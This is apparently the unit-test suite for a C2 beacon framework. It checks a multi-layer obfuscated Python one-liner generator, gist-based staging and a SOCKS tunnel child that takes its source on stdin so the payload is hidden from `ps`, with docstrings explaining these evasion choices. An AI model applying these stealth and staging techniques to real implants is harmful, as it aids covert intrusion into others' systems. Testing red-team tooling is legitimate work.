#!/usr/bin/env python3
"""
Unit tests for the tunnel child: how a generated artifact starts a second
mode of itself without its own source reaching a command line.

What this task has to get right, and how these tests hold it.

**`python3 -c` leaves nothing to re-execute.** `sys.argv[0]` is the literal
string `-c`, so `_get_beacon_path` returns `-c` resolved against the
working directory in exactly the mode this project ships. The artifact
therefore has to keep its own source, which is what `_obfuscate_layer`'s
`_src` binding is for, and the child is started as `python3 -` with that
source on stdin. The three alternatives are all worse: re-running
`python3 -c '<blob>'` puts a quarter of a megabyte into `ps`, writing the
source to a file throws away the in-memory property the one-liner exists
for, and `fork` does not exist on Windows.

**The retention test can pass for the wrong reason.** With N layers, each
layer's decompressed text is the next layer's wrapper, so if every layer
assigns the same global the last assignment wins and `_src` ends up
correct by accident. So these tests do not ask whether `_src` is set: they
ask whether it *is* the innermost payload, by comparing it against
`beacon.py` on disk plus the appended config block, and by asserting that
the one string every wrapper carries -- `zlib.decompress` -- is absent
from it. Checked at one layer and at six.

**The artifact is exec'd under a name that is not `__main__`.** The
appended config block ends in `while True: time.sleep(60)`; exec'ing it as
`__main__` would start a beacon and never return.

**The command-line probe is proved not to be blind.** A test that reads a
command line and finds no payload in it passes just as well when the
reading is broken. `test_the_command_line_probe_can_see_a_payload` starts
a child that really does carry a blob on its command line and asserts the
same probe finds it. The probe reads `/proc/<pid>/cmdline` on Linux and
`ps -o command= -p <pid>` on Darwin, because this is developed on a
machine with no `/proc`.

**Both generator routes are exercised.** `_obfuscate_layer` used to exist
twice, once in `api_beacon_gen` and once in `api_beacon_gist`, and one
fact in two places is this repository's most frequent defect. The gist
route is driven with `gh` replaced, and what it would have uploaded is
read back out of the temporary file it hands to `gh gist create` and
exec'd like the other one.

**Nothing is left running.** Every test that starts a child registers a
cleanup that kills it, and the stop test waits for the pid to leave the
process table rather than assuming `terminate` worked.

**One test runs the whole chain.**
`TestTheChildReachesTheTunnelServer` hands `beacon.py` plus a config block
with a hand-built `tunnel` key to the real spawn, and the child that comes
out of it completes a Noise handshake with a real `TunnelServer` in this
process. The config is built by hand because Task 9, not this one,
teaches the generator to produce a tunnel block; everything else there is
the production path.
"""

import base64
import os
import platform
import re
import subprocess
import sys
import tempfile
import time
import unittest
from pathlib import Path
from unittest import mock

from software.c2 import beacon as beacon_mod
from software.c2 import server as server_mod
from software.c2.beacon import Beacon
from software.c2.server import ServerCrypto, create_app
from software.c2.tunnel.keys import KeyStore
from software.c2.tunnel.server import TunnelServer

_LOOPBACK = "127.0.0.1"
_BEACON_PY = Path(beacon_mod.__file__)

# The range the tunnel server assigns loopback SOCKS ports from. Nothing in
# this module binds one, so it is a pair of numbers in a JSON file and not a
# port in a test; every listener here binds 0 and is read back.
_PORT_RANGE = (40500, 40599)

# The string every obfuscation wrapper carries and no Python source in this
# repository does -- `beacon.py` does not import zlib at all. Its absence
# from `_src` is what proves `_src` is the innermost payload and not one of
# the layers wrapped around it.
_WRAPPER_MARK = b"zlib.decompress"

# A marker from the middle of `beacon.py`: present in the innermost payload
# and, because every layer above it is compressed and base64-encoded, in no
# wrapper.
_SOURCE_MARK = b"class TunnelEndpoint(object):"

_ABSENT = object()


def _command_line(pid):
    """Everything this platform will show of one process's command line.

    `/proc/<pid>/cmdline` on Linux and `ps` on Darwin: this is developed on
    a machine with no `/proc`, so a test written for `/proc` alone could
    not run where it was written. The empty string means the process is
    gone, which is what both sources say about a reaped pid.
    """
    system = platform.system()
    if system == "Linux":
        try:
            with open("/proc/%d/cmdline" % pid, "rb") as handle:
                raw = handle.read()
        except (FileNotFoundError, ProcessLookupError):
            return ""
        return raw.replace(b"\x00", b" ").decode("utf-8", "replace").strip()
    if system == "Darwin":
        done = subprocess.run(["ps", "-o", "command=", "-p", str(pid)],
                              capture_output=True, text=True, timeout=30)
        return done.stdout.strip()
    raise unittest.SkipTest(
        "no way to read another process's command line on %s" % system)


def _dash_children():
    """Every child of this process whose command line ends in `-`.

    The identifying feature of a tunnel child, and the question
    `test_tunnel_start_twice...` has to answer is how many of them there
    are. Counting all children instead would be answered by whatever else
    the suite has running when this module is reached.

    The `ps` run by this function is itself a child of this process while
    it runs, which is why its own row is dropped by name.
    """
    done = subprocess.run(["ps", "-e", "-o", "pid=,ppid=,command="],
                          capture_output=True, text=True, timeout=30)
    mine = os.getpid()
    found = []
    for line in done.stdout.splitlines():
        parts = line.split(None, 2)
        if len(parts) != 3:
            continue
        try:
            pid, ppid = int(parts[0]), int(parts[1])
        except ValueError:
            continue
        if ppid != mine:
            continue
        command = parts[2].strip()
        if os.path.basename(command.split()[0]) == "ps":
            continue
        if command.endswith(" -"):
            found.append((pid, command))
    return found


def _beacon_config():
    """A beacon that dials nothing: every transport is off."""
    return {
        "c2": {
            "beacon_interval_seconds": 10,
            "jitter_percent": 0,
            "encryption_key": base64.b64encode(os.urandom(32)).decode(),
            "proxy": {"mode": "none"},
            "https": {"enabled": False, "callback_url": "",
                      "verify_ssl": False},
        }
    }


def _gen_cfg(tunnel=None):
    """A generator config of the shape both routes build.

    `tunnel` is passed by hand because Task 9, not this one, adds that key
    to what the routes produce -- so the bootstrap's tunnel branch has to
    be reachable without going through a generator that cannot make one.
    """
    cfg = {
        "https": {"enabled": True, "callback_url": "http://127.0.0.1:1/x",
                  "verify_ssl": False},
        "dns": {"enabled": False, "domain": "", "resolver": "8.8.8.8"},
        "smb": {"enabled": False, "pipe_name": "msrpc_6e2f", "server": ""},
        "quic": {"enabled": False, "server": ""},
        "proxy": {"mode": "none", "url": "", "ntlm": {"enabled": False}},
        "c2_profile": {},
    }
    if tunnel is not None:
        cfg["tunnel"] = tunnel
    return cfg


# A child that proves what it was given. Written as three pieces so a
# payload of any size can be padded in between: `python -` compiles the
# whole of stdin before it runs a line of it, so a source that arrived
# truncated is a SyntaxError and writes no proof at all. The proof is
# written last, after the tail marker is defined, so a file that exists
# names both ends of the source.
_PROOF_HEAD = """\
import os, sys, time
HEAD = "%(head)s"
"""
_PROOF_TAIL = """\
TAIL = "%(tail)s"
with open(os.environ["RACCOON_SPAWN_PROOF"], "w") as handle:
    handle.write("\\n".join([
        HEAD, TAIL,
        os.environ.get("RACCOON_TUNNEL_MODE", "<unset>"),
        repr(sys.argv),
        str(os.getpid()),
    ]))
time.sleep(%(sleep)s)
"""


def _proof_source(head, tail, padding=0, sleep=120):
    """A child that records what it received and then waits to be found."""
    body = _PROOF_HEAD % {"head": head}
    if padding:
        body += "PAD = %r\n" % ("p" * padding)
    return body + _PROOF_TAIL % {"tail": tail, "sleep": sleep}


class SpawnTestCase(unittest.TestCase):
    """A beacon, a scratch directory, and nothing left running."""

    def setUp(self):
        tmp = tempfile.TemporaryDirectory()
        self.addCleanup(tmp.cleanup)
        self.root = tmp.name
        self.beacon = Beacon(_beacon_config())
        # Registered first so it runs last: every assertion is made before
        # anything is killed, and nothing survives this test either way.
        self.addCleanup(self._reap)

    def _reap(self):
        proc = getattr(self.beacon, "_tunnel_proc", None)
        if proc is None:
            return
        if proc.poll() is None:
            proc.kill()
        proc.wait(timeout=30)

    # ── harness ──

    def set_src(self, source):
        """Bind the module global a generated artifact would carry.

        The real binding is written by `_obfuscate_layer`; this is the
        same global under the same name, which is the whole of what
        `_exec_tunnel` reads.
        """
        if isinstance(source, str):
            source = source.encode("utf-8")
        previous = beacon_mod.__dict__.get("_src", _ABSENT)
        beacon_mod._src = source
        self.addCleanup(self._restore_src, previous)
        return source

    def no_src(self):
        """Remove `_src`, the state of this file run from a checkout."""
        previous = beacon_mod.__dict__.get("_src", _ABSENT)
        beacon_mod.__dict__.pop("_src", None)
        self.addCleanup(self._restore_src, previous)

    def _restore_src(self, previous):
        if previous is _ABSENT:
            beacon_mod.__dict__.pop("_src", None)
        else:
            beacon_mod._src = previous

    def stand_in(self, name, body):
        """An executable that is not an interpreter, for `sys.executable`.

        A body that has to keep running should `exec` it, so the process
        the beacon holds is the one that is doing the waiting: a shell
        left in the middle would make a kill leave a grandchild behind.
        """
        path = os.path.join(self.root, name)
        with open(path, "w") as handle:
            handle.write("#!/bin/sh\n%s\n" % body)
        os.chmod(path, 0o755)
        return path

    def proof_path(self):
        """A path the child writes to, handed over through the environment.

        Through the environment because `python3 -` has no command line to
        carry it -- the same constraint the mode flag is under -- and
        because the child inheriting this process's environment is itself
        something worth holding.
        """
        path = os.path.join(self.root, "proof.txt")
        patch = mock.patch.dict(os.environ, {"RACCOON_SPAWN_PROOF": path})
        patch.start()
        self.addCleanup(patch.stop)
        return path

    def wait_for(self, predicate, timeout=30.0, what="condition"):
        deadline = time.time() + timeout
        while time.time() < deadline:
            if predicate():
                return True
            time.sleep(0.02)
        self.fail("%s was still false after %.1fs" % (what, timeout))

    def wait_for_file(self, path, timeout=30.0):
        self.wait_for(lambda: os.path.exists(path), timeout=timeout,
                      what="the child writing %s" % path)
        return Path(path).read_text().splitlines()


# ── The generator: an artifact that can hand over its own source ──


class TestGeneratedArtifactKeepsItsSource(unittest.TestCase):
    """The one-liner binds the source it decompressed to `_src`.

    Driven through the real route, because `_obfuscate_layer` is what is
    under test and the layer count comes in through the request body.
    """

    @classmethod
    def setUpClass(cls):
        cls._tmp = tempfile.TemporaryDirectory()
        cls.app = create_app(ServerCrypto(os.urandom(32)), "test-token",
                             Path(cls._tmp.name))
        cls.app.config["TESTING"] = True
        cls.client = cls.app.test_client()
        cls.beacon_source = _BEACON_PY.read_text(encoding="utf-8")

    @classmethod
    def tearDownClass(cls):
        cls._tmp.cleanup()

    # ── harness ──

    def generate(self, layers):
        response = self.client.post(
            "/api/server/beacon-gen",
            json={"c2_url": "http://127.0.0.1:1/api/v1/beacon",
                  "layers": layers},
            headers={"Authorization": "Bearer test-token"})
        self.assertEqual(response.status_code, 200, response.data[:400])
        body = response.get_json()
        self.assertEqual(body["layers"], layers)
        return body

    @staticmethod
    def artifact(body):
        """The Python inside `python3 -c '...'`, without the quoting."""
        prefix = "python3 -c '"
        one = body["oneliner_unix"]
        assert one.startswith(prefix) and one.endswith("'"), one[:80]
        return one[len(prefix):-1]

    @staticmethod
    def run_artifact(code):
        """exec the artifact and hand back the namespace it built.

        `__name__` is deliberately not `__main__`: the appended config
        block's last act is an endless sleep, so an artifact exec'd as
        `__main__` would start a beacon and never come back.
        """
        namespace = {"__name__": "raccoon_artifact_under_test"}
        exec(compile(code, "<generated artifact>", "exec"), namespace)
        return namespace

    def assert_is_the_innermost_source(self, src, body):
        """`src` is the payload the generator started from, exactly."""
        self.assertIsInstance(src, bytes, "_src is not bytes")
        text = src.decode("utf-8")
        # Against the decoded text: `deob` sizes are character counts of
        # the str the generator compressed, and `beacon.py` has non-ASCII
        # in it, so the byte count is legitimately larger.
        sizes = {entry["layer"]: entry["size"] for entry in body["deob"]}
        self.assertEqual(len(text), sizes[0],
                         "_src is not the size of the original source")
        for layer, size in sizes.items():
            if layer:
                self.assertNotEqual(
                    len(text), size,
                    "_src is the size of layer %d, a wrapper" % layer)
        self.assertTrue(
            text.startswith(self.beacon_source),
            "_src does not begin with beacon.py as it is on disk")
        self.assertTrue(
            text[len(self.beacon_source):].lstrip().startswith(
                'if __name__=="__main__":'),
            "_src does not end in the appended config block")
        self.assertIn(_SOURCE_MARK, src)
        self.assertNotIn(_WRAPPER_MARK, src,
                         "_src carries a wrapper's own text, so it is a "
                         "layer and not the source")

    # ── tests ──

    def test_generated_artifact_exposes_its_own_source_as__src(self):
        body = self.generate(3)
        namespace = self.run_artifact(self.artifact(body))
        self.assertTrue("_src" in namespace,
                        "the artifact kept no copy of its own source, so a "
                        "child cannot be given it")
        self.assert_is_the_innermost_source(namespace["_src"], body)

    def test__src_is_the_innermost_source_not_an_intermediate_layer(self):
        # Both ends of the supported range: with one layer there is a
        # single assignment and with six there are six, and the test that
        # only asks whether `_src` is set cannot tell a correct innermost
        # binding from five wrong ones followed by a right one.
        for layers in (1, 6):
            with self.subTest(layers=layers):
                body = self.generate(layers)
                code = self.artifact(body)
                self.assertEqual(code.count(_WRAPPER_MARK.decode()), 1,
                                 "the outermost layer is not one wrapper")
                namespace = self.run_artifact(code)
                self.assert_is_the_innermost_source(namespace["_src"], body)

    def test_source_retention_holds_for_one_layer_and_for_six(self):
        for layers in range(1, 7):
            with self.subTest(layers=layers):
                body = self.generate(layers)
                namespace = self.run_artifact(self.artifact(body))
                self.assert_is_the_innermost_source(namespace["_src"], body)

    def test_the_artifact_still_defines_what_it_defined_before(self):
        # Source retention must not have cost the artifact its contents:
        # the beacon and the endpoint are both what a child is started for.
        namespace = self.run_artifact(self.artifact(self.generate(2)))
        for name in ("Beacon", "TunnelEndpoint", "tunnel_config_problem"):
            self.assertTrue(name in namespace,
                            "the artifact no longer defines %s" % name)

    def test_the_gist_route_retains_the_source_too(self):
        """The second copy of the layer builder, exercised not inspected.

        `gh` is replaced and what the route would have uploaded is read
        back out of the file it hands to `gh gist create`, so this is the
        gist route's real output and not a restatement of the other one.
        """
        uploaded = {}

        def fake_run(args, **kwargs):
            args = list(args)
            if args[:2] == ["gh", "auth"]:
                return subprocess.CompletedProcess(args, 0, "", "")
            if args[:3] == ["gh", "gist", "create"]:
                uploaded["stage"] = Path(args[-1]).read_text(encoding="utf-8")
                return subprocess.CompletedProcess(
                    args, 0, "https://gist.github.com/u/deadbeef\n", "")
            if args[:2] == ["gh", "api"]:
                return subprocess.CompletedProcess(args, 0, "", "")
            raise AssertionError("unexpected command: %r" % (args,))

        pending = server_mod._pending_gists
        before = dict(pending)
        self.addCleanup(lambda: (pending.clear(), pending.update(before)))
        with mock.patch.object(server_mod.subprocess, "run", fake_run):
            response = self.client.post(
                "/api/server/beacon-gist",
                json={"c2_url": "http://127.0.0.1:1/api/v1/beacon",
                      "layers": 2},
                headers={"Authorization": "Bearer test-token"})
        self.assertEqual(response.status_code, 200, response.data[:400])
        self.assertIn("stage", uploaded, "the route uploaded nothing")
        namespace = self.run_artifact(uploaded["stage"])
        self.assertTrue("_src" in namespace,
                        "the gist route's artifact kept no copy of its "
                        "source; the second layer builder was not changed")
        self.assertTrue(namespace["_src"].decode("utf-8").startswith(
            self.beacon_source))
        self.assertNotIn(_WRAPPER_MARK, namespace["_src"])

    def test_the_layer_builder_is_written_once(self):
        # The duplication itself, not only its two outputs: the two routes
        # drifted apart once already, and a test on behaviour alone would
        # let the next copy be added.
        text = Path(server_mod.__file__).read_text(encoding="utf-8")
        self.assertEqual(len(re.findall(r"^def _obfuscate_layer\(",
                                        text, re.M)), 1,
                         "the layer builder is not a single module-level "
                         "function")
        self.assertEqual(len(re.findall(r"def _obfuscate_layer\(", text)), 1,
                         "a route carries a layer builder of its own again")
        self.assertEqual(text.count('globals()["_src"]=zlib'), 1,
                         "the emitted wrapper is written in more than one "
                         "place")
        for route in ("api_beacon_gen", "api_beacon_gist"):
            start = text.index("def %s(" % route)
            body = text[start:text.index("\n    @app.route", start)]
            self.assertIn("_obfuscate_layer(", body,
                          "%s does not use the shared layer builder" % route)


# ── The spawn ──


class TestTheTunnelChild(SpawnTestCase):
    """`_exec_tunnel("start")` and what the child it leaves behind is."""

    def test_tunnel_start_spawns_a_child_whose_cmdline_carries_no_payload(self):
        payload_mark = "PAYLOAD-" + "m" * 400
        self.set_src(_proof_source(payload_mark, "tail", padding=200000))
        self.proof_path()

        output = self.beacon._exec_tunnel("start")
        proc = self.beacon._tunnel_proc
        self.assertIsNotNone(proc, "no child was started")
        self.assertIsNone(proc.poll(), "the child was gone immediately")
        self.assertIn(str(proc.pid), output)

        command = _command_line(proc.pid)
        self.assertTrue(command, "the probe read no command line at all")
        self.assertNotIn(payload_mark, command,
                         "the child's command line carries the payload")
        self.assertNotIn("PAD", command)
        self.assertLess(len(command), 512,
                        "the command line is not the unremarkable one this "
                        "whole mechanism exists to produce: %r" % command)
        # `python3 -`, nothing after it: the source came on stdin.
        self.assertTrue(command.endswith(" -"),
                        "the child was not started as `python -`: %r"
                        % command)
        self.assertEqual(command.split()[-1], "-")
        self.assertNotIn("-c", command.split(),
                         "the child was started with -c, which is the form "
                         "that puts the payload in ps in the first place")

    def test_the_command_line_probe_can_see_a_payload(self):
        # The control for the test above. A probe that reads nothing, or
        # that reads a line truncated to the terminal width, would find no
        # payload in any command line and agree with every assertion made
        # about one.
        blob = "SEEN-" + "s" * 3000
        proc = subprocess.Popen(
            [sys.executable, "-c",
             "import time;MARK=%r;time.sleep(120)" % blob],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        self.addCleanup(proc.wait, 30)
        self.addCleanup(proc.kill)
        self.wait_for(lambda: bool(_command_line(proc.pid)),
                      what="the control child appearing")
        command = _command_line(proc.pid)
        self.assertIn(blob, command,
                      "the probe cannot see a payload that really is on a "
                      "command line, so finding none proves nothing")

    def test_the_child_receives_the_source_on_stdin(self):
        head, tail = "HEAD-5f2a", "TAIL-9c71"
        source = self.set_src(_proof_source(head, tail, padding=250000))
        self.assertGreater(len(source), 250000)
        path = self.proof_path()

        self.beacon._exec_tunnel("start")
        lines = self.wait_for_file(path)

        self.assertEqual(lines[0], head)
        # The tail is the last statement before the proof is written, so a
        # source that arrived cut short could not have produced this file.
        self.assertEqual(lines[1], tail)
        self.assertEqual(lines[3], repr(["-"]),
                         "the child was not run as `python -`")
        self.assertEqual(int(lines[4]), self.beacon._tunnel_proc.pid)

    def test_the_child_is_told_it_is_the_tunnel_by_the_environment(self):
        self.set_src(_proof_source("h", "t"))
        path = self.proof_path()
        self.beacon._exec_tunnel("start")
        lines = self.wait_for_file(path)
        self.assertEqual(lines[2], "1",
                         "the child was not given RACCOON_TUNNEL_MODE")
        # And this process is not left holding it: the beacon sets it on
        # the child's environment, not on its own.
        self.assertNotIn(beacon_mod._TUNNEL_MODE_ENV, os.environ)

    def test_tunnel_stop_terminates_the_child_and_reports_it(self):
        self.set_src(_proof_source("h", "t"))
        path = self.proof_path()
        self.beacon._exec_tunnel("start")
        proc = self.beacon._tunnel_proc
        pid = proc.pid
        self.wait_for_file(path)

        output = self.beacon._exec_tunnel("stop")
        self.assertIsNotNone(proc.poll(), "the child outlived its stop")
        self.assertIn(str(pid), output)
        self.assertIn("stopped", output.lower())
        if os.name == "posix":
            # SIGTERM, not SIGKILL. An endpoint that is asked to go gets
            # to close its command channel; one that is killed leaves the
            # tunnel server holding a dead channel until its idle timeout,
            # and the operator's port with it. -15 in the reported exit
            # code is the whole evidence that it was asked first.
            self.assertEqual(proc.returncode, -15,
                             "the child was killed rather than terminated")
            self.assertIn("exit -15", output)
        self.wait_for(lambda: not _command_line(pid), timeout=10.0,
                      what="the child's pid leaving the process table")

    def test_tunnel_stop_without_a_child_says_so(self):
        output = self.beacon._exec_tunnel("stop")
        self.assertIn("no tunnel", output.lower())
        self.assertIsNone(self.beacon._tunnel_proc)

    def test_tunnel_start_twice_does_not_spawn_a_second_child(self):
        self.set_src(_proof_source("h", "t"))
        path = self.proof_path()
        self.beacon._exec_tunnel("start")
        first = self.beacon._tunnel_proc
        self.wait_for_file(path)
        self.assertEqual(len(_dash_children()), 1)

        output = self.beacon._exec_tunnel("start")

        self.assertIs(self.beacon._tunnel_proc, first,
                      "the second start replaced the child")
        self.assertIn("already running", output.lower())
        self.assertIn(str(first.pid), output)
        self.assertEqual(len(_dash_children()), 1,
                         "a second `python -` child is running")
        self.assertIsNone(first.poll(), "the first child was stopped")

    def test_a_child_that_dies_is_reported_as_dead_at_the_next_check_in(self):
        self.set_src("raise SystemExit(7)\n")
        self.beacon._exec_tunnel("start")
        proc = self.beacon._tunnel_proc
        pid = proc.pid
        self.wait_for(lambda: proc.poll() is not None,
                      what="the child exiting")

        row = self.beacon._system_info().get("tunnel")
        self.assertIsNotNone(row, "the check-in says nothing about a tunnel "
                                  "this beacon started")
        self.assertFalse(row["running"],
                         "a child that has exited is reported as running")
        self.assertEqual(row["exit_code"], 7,
                         "the check-in does not say how the child died")
        self.assertEqual(row["pid"], pid)

    def test_a_live_child_is_reported_as_running_at_the_next_check_in(self):
        self.set_src(_proof_source("h", "t"))
        path = self.proof_path()
        self.beacon._exec_tunnel("start")
        self.wait_for_file(path)
        row = self.beacon._system_info().get("tunnel")
        self.assertTrue(row["running"])
        self.assertEqual(row["pid"], self.beacon._tunnel_proc.pid)
        self.assertNotIn("exit_code", row)

    def test_a_beacon_with_no_tunnel_child_says_nothing_about_one(self):
        # The check-in payload of every build that has no tunnel is
        # unchanged, which is what keeps `test_status_quo`'s registration
        # tests meaningful.
        self.assertNotIn("tunnel", self.beacon._system_info())

    def test_a_stopped_child_is_still_reported_so_a_stop_is_confirmed(self):
        # An operator's stop is pending until a check-in confirms it, so
        # the record outlives the child rather than vanishing with it.
        self.set_src(_proof_source("h", "t"))
        path = self.proof_path()
        self.beacon._exec_tunnel("start")
        self.wait_for_file(path)
        self.beacon._exec_tunnel("stop")
        row = self.beacon._system_info().get("tunnel")
        self.assertIsNotNone(row)
        self.assertFalse(row["running"])
        self.assertIn("exit_code", row)

    def test_the_beacons_own_stop_takes_the_child_with_it(self):
        # Otherwise `kill` leaves a tunnel nothing can reach: the beacon
        # that was the only way to task it is gone.
        self.set_src(_proof_source("h", "t"))
        path = self.proof_path()
        self.beacon._exec_tunnel("start")
        proc = self.beacon._tunnel_proc
        self.wait_for_file(path)
        self.beacon.stop()
        self.assertIsNotNone(proc.poll(), "the child outlived the beacon")

    @unittest.skipIf(os.name != "posix",
                     "the stand-in interpreter is a shell script")
    def test_a_child_that_reads_no_source_does_not_hang_the_beacon(self):
        # The pipe holds about 64 KB; a child that reads none of it would
        # park the beacon's own loop in `write` for ever, and the beacon
        # is the access that the tunnel is only a convenience on top of.
        # `sys.executable` pointing at an embedded interpreter or a frozen
        # host application is how this happens for real.
        stand_in = self.stand_in("not-an-interpreter", "exec sleep 120")
        patches = [
            mock.patch.object(beacon_mod.sys, "executable", stand_in),
            mock.patch.object(beacon_mod, "_TUNNEL_SOURCE_TIMEOUT", 1.0),
        ]
        for patch in patches:
            patch.start()
            self.addCleanup(patch.stop)
        self.set_src(_proof_source("h", "t", padding=250000))

        started = time.time()
        output = self.beacon._exec_tunnel("start")
        took = time.time() - started

        self.assertLess(took, 30.0,
                        "the beacon was held in the write to the child")
        self.assertIn("[error]", output)
        self.assertIn("killed", output)
        # -9 is the kill, reaped: the child that read nothing is gone and
        # was waited for, rather than left behind unreported.
        self.assertIn("exit -9", output)
        self.assertIsNone(self.beacon._tunnel_proc,
                          "a child that never got the source is recorded as "
                          "the running tunnel")

    @unittest.skipIf(os.name != "posix",
                     "the stand-in interpreter is a shell script")
    def test_a_child_that_dies_before_it_reads_is_reported(self):
        # A broken pipe rather than a full one. The beacon must not go on
        # to report a tunnel it has not got.
        stand_in = self.stand_in("exits-at-once", "exit 3")
        patch = mock.patch.object(beacon_mod.sys, "executable", stand_in)
        patch.start()
        self.addCleanup(patch.stop)
        self.set_src(_proof_source("h", "t", padding=250000))

        output = self.beacon._exec_tunnel("start")
        self.assertIn("[error]", output)
        self.assertIsNone(self.beacon._tunnel_proc)

    def test_an_unknown_tunnel_action_names_the_two_that_exist(self):
        for action in ("", "status", "restart"):
            with self.subTest(action=action):
                output = self.beacon._exec_tunnel(action)
                self.assertIn("[error]", output)
                # The guidance in full, not the bare words: "restart"
                # contains "start", and an assertion on that would pass
                # against a message that only echoed the action back.
                self.assertIn("'tunnel start'", output)
                self.assertIn("'tunnel stop'", output)
        self.assertIsNone(self.beacon._tunnel_proc,
                          "an unknown action started something")

    def test_tunnel_is_a_verb_the_beacon_dispatches_on(self):
        # Reachable from tasking, which is the only way Task 10's panel can
        # reach it, and named in the agent's copy of the verb table.
        from software.agent.executor import beacon as beacon_exec
        self.assertIn("tunnel", beacon_exec.BEACON_VERBS)
        with mock.patch.object(self.beacon, "_exec_tunnel",
                               return_value="done") as called:
            self.beacon._process_tasking({"cmd": "tunnel", "args": "stop",
                                          "id": ""})
        called.assert_called_once_with("stop")


class TestWhereTheSourceComesFrom(SpawnTestCase):
    """`_src`, and the fallback for a checkout that has no `_src`."""

    def test__src_is_used_and_named_when_the_artifact_carries_one(self):
        self.set_src(_proof_source("h", "t"))
        source, origin = self.beacon._tunnel_source()
        self.assertTrue(source.startswith(b"import os, sys, time"))
        self.assertIn("_src", origin)
        self.assertIn(str(len(source)), origin)

    def test_the_source_falls_back_to_the_file_and_says_which_path(self):
        # A developer running this file from a checkout is not running a
        # generated artifact and has no `_src`; they should not be
        # debugging a missing global.
        self.no_src()
        source, origin = self.beacon._tunnel_source()
        self.assertEqual(source, _BEACON_PY.read_bytes())
        self.assertIn(str(_BEACON_PY), origin)
        self.assertIn("_src", origin,
                      "the fallback does not say why it was taken")

    def test_start_reports_which_source_the_child_was_given(self):
        self.no_src()
        output = self.beacon._exec_tunnel("start")
        self.assertIn(str(_BEACON_PY), output)
        # beacon.py has no `__main__` block of its own, so this child
        # defines everything and exits; what matters is that it was given
        # the file and that the message said so.
        proc = self.beacon._tunnel_proc
        self.wait_for(lambda: proc.poll() is not None,
                      what="the checkout's own source exiting")


# ── The config block's bootstrap ──


class TestTheBootstrapBranch(unittest.TestCase):
    """What the appended config block does with `RACCOON_TUNNEL_MODE`."""

    @classmethod
    def setUpClass(cls):
        cls.beacon_source = _BEACON_PY.read_text(encoding="utf-8")

    def block(self, tunnel=None):
        return server_mod._beacon_config_block(
            _gen_cfg(tunnel), 300, 20,
            base64.b64encode(os.urandom(32)).decode())

    def artifact(self, tunnel=None):
        return self.beacon_source + "\n" + self.block(tunnel)

    def run_in_tunnel_mode(self, source, timeout=120):
        env = dict(os.environ)
        env[beacon_mod._TUNNEL_MODE_ENV] = "1"
        done = subprocess.run([sys.executable, "-"],
                              input=source.encode("utf-8"),
                              stdout=subprocess.PIPE,
                              stderr=subprocess.PIPE,
                              env=env, timeout=timeout)
        return done

    def test_the_mode_variable_is_read_from_the_beacons_own_constant(self):
        # One name, in the file that is both the parent and the child. The
        # generated block sits below that constant, so it can use it
        # rather than repeat the string the way `_obfuscate_layer` was
        # repeated.
        self.assertEqual(beacon_mod._TUNNEL_MODE_ENV, "RACCOON_TUNNEL_MODE")
        block = self.block()
        self.assertIn("_TUNNEL_MODE_ENV", block)
        self.assertNotIn("RACCOON_TUNNEL_MODE", block,
                         "the config block repeats the variable's name "
                         "instead of reading the beacon's constant")

    def test_the_bootstrap_branches_on_the_mode(self):
        block = self.block()
        self.assertIn("TunnelEndpoint(", block)
        self.assertIn("Beacon(", block)
        # Compiled, not exec'd: the non-tunnel branch of this block ends in
        # an endless sleep, and the tunnel branch is run for real below.
        compile(self.artifact(), "<artifact>", "exec")

    def test_tunnel_mode_without_a_tunnel_block_refuses_and_names_it(self):
        # Task 9 adds the key; until then, and for every build generated
        # without a tunnel afterwards, the child has to say what is
        # missing rather than dial nothing in a loop.
        done = self.run_in_tunnel_mode(self.artifact())
        self.assertNotEqual(done.returncode, 0,
                            "tunnel mode started without a tunnel config")
        message = done.stderr.decode("utf-8", "replace")
        self.assertIn("c2.tunnel", message)
        self.assertIn("RACCOON_TUNNEL_MODE", message)
        self.assertEqual(done.stdout, b"")

    def test_a_disabled_tunnel_block_is_refused_the_same_way(self):
        done = self.run_in_tunnel_mode(
            self.artifact({"enabled": False, "server": _LOOPBACK}))
        self.assertNotEqual(done.returncode, 0)
        self.assertIn("c2.tunnel",
                      done.stderr.decode("utf-8", "replace"))

    def test_a_half_filled_tunnel_block_names_the_missing_field(self):
        done = self.run_in_tunnel_mode(self.artifact({
            "enabled": True, "server": _LOOPBACK, "identity": "build-alpha",
            "port": 1, "public_key": base64.b64encode(b"\x00" * 32).decode(),
        }))
        self.assertNotEqual(done.returncode, 0)
        self.assertIn("c2.tunnel.psk",
                      done.stderr.decode("utf-8", "replace"))


# ── End to end: the child really is an endpoint ──


class TestTheChildReachesTheTunnelServer(SpawnTestCase):
    """A real child, started by the real spawn, against a real server.

    The one test that proves the whole chain rather than a link of it:
    `_exec_tunnel("start")` hands `beacon.py` plus a hand-built config
    block to `python3 -` on stdin, and the process that comes out
    completes a Noise handshake with a `TunnelServer` in this process. The
    config is built by hand because Task 9, not this one, teaches the
    generator to produce a tunnel block.
    """

    def setUp(self):
        super(TestTheChildReachesTheTunnelServer, self).setUp()
        self.store = KeyStore(os.path.join(self.root, "keys.json"))
        self.identity = "build-alpha"
        self.psk = os.urandom(32)
        self.store.register_build(self.identity, self.psk)
        self.server = TunnelServer(
            self.store, _LOOPBACK, 0, _PORT_RANGE,
            os.path.join(self.root, "ports.json"),
            keepalive_interval=30.0, idle_timeout=30.0,
            handshake_timeout=20.0, session_timeout=30.0)
        self.server.start()
        self.addCleanup(self.server.stop)

    def row(self):
        for row in self.server.endpoints():
            if row["identity"] == self.identity:
                return row
        return {"identity": self.identity, "state": "absent"}

    def test_the_child_connects_as_the_tunnel_endpoint(self):
        tunnel = {
            "enabled": True,
            "server": _LOOPBACK,
            "port": self.server.port,
            "public_key": base64.b64encode(
                self.store.static_public()).decode("ascii"),
            "psk": base64.b64encode(self.psk).decode("ascii"),
            "identity": self.identity,
            # This machine may have no libcrypto; a tunnel on the slow
            # path is still a tunnel, and the refusal is Task 7's test.
            "allow_slow_crypto": True,
        }
        block = server_mod._beacon_config_block(
            _gen_cfg(tunnel), 300, 20,
            base64.b64encode(os.urandom(32)).decode())
        self.set_src(_BEACON_PY.read_text(encoding="utf-8") + "\n" + block)

        self.beacon._exec_tunnel("start")
        proc = self.beacon._tunnel_proc
        self.wait_for(lambda: self.row()["state"] == "connected",
                      timeout=60.0,
                      what="the child registering as %r" % self.identity)
        self.assertIsNone(proc.poll(), "the child died after connecting")
        self.assertTrue(self.row()["port"],
                        "the endpoint was issued no SOCKS port")

        self.beacon._exec_tunnel("stop")
        self.assertIsNotNone(proc.poll())
